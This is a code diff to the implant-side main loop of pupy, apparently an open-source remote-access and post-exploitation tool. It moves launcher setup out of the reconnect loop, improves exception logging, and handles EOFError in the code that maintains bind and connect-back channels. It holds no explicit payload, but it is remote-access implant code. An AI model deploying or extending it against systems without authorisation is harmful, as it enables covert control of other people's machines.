@@ -172,6 +172,7 @@ class BindSlaveService(ReverseSlaveService):
         except:
             from network.transports import DEFAULT_BIND_PAYLOADS_PASSWORD
             password = DEFAULT_BIND_PAYLOADS_PASSWORD
+
         if self._conn.root.get_password() != password:
             self._conn.close()
             raise KeyboardInterrupt("wrong password")
@@ -234,26 +235,27 @@ def main():
             logging.warning(
                 "ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
 
+
+    launcher = conf.launchers[LAUNCHER]()
+    try:
+        launcher.parse_args(LAUNCHER_ARGS)
+    except LauncherError as e:
+        launcher.arg_parser.print_usage()
+        exit(str(e))
+    if getattr(pupy, 'pseudo', False):
+        set_connect_back_host(launcher.get_host())
+    else:
+        pupy.get_connect_back_host = launcher.get_host
+
+    pupy.infos['launcher'] = LAUNCHER
+    pupy.infos['launcher_args'] = LAUNCHER_ARGS
+    pupy.infos['launcher_inst'] = launcher
+    pupy.infos['transport'] = launcher.get_transport()
+
     exited = False
 
     while not exited:
         try:
-            launcher = conf.launchers[LAUNCHER]()
-            try:
-                launcher.parse_args(LAUNCHER_ARGS)
-            except LauncherError as e:
-                launcher.arg_parser.print_usage()
-                exit(str(e))
-            if getattr(pupy, 'pseudo', False):
-                set_connect_back_host(launcher.get_host())
-            else:
-                pupy.get_connect_back_host = launcher.get_host
-
-            pupy.infos['launcher'] = LAUNCHER
-            pupy.infos['launcher_args'] = LAUNCHER_ARGS
-            pupy.infos['launcher_inst'] = launcher
-            pupy.infos['transport'] = launcher.get_transport()
-
             rpyc_loop(launcher)
 
         except Exception as e:
@@ -261,7 +263,7 @@ def main():
                 exited = True
 
             try:
-                logging.error(e)
+                logging.exception(e)
             except:
                 print "Exception ({}): {}".format(type(e), e)
 
@@ -285,7 +287,8 @@ def rpyc_loop(launcher):
                     authenticator=authenticator,
                     stream=stream,
                     transport=transport,
-                    transport_kwargs=transport_kwargs
+                    transport_kwargs=transport_kwargs,
+                    pupy_srv=None,
                 )
                 s.start()
 
@@ -320,9 +323,12 @@ def rpyc_loop(launcher):
         except SystemExit:
             raise
 
+        except EOFError:
+            pass
+
         except Exception as e:
             try:
-                logging.error(e)
+                logging.exception(e)
             except:
                 print "Exception ({}): {}".format(type(e), e)
 
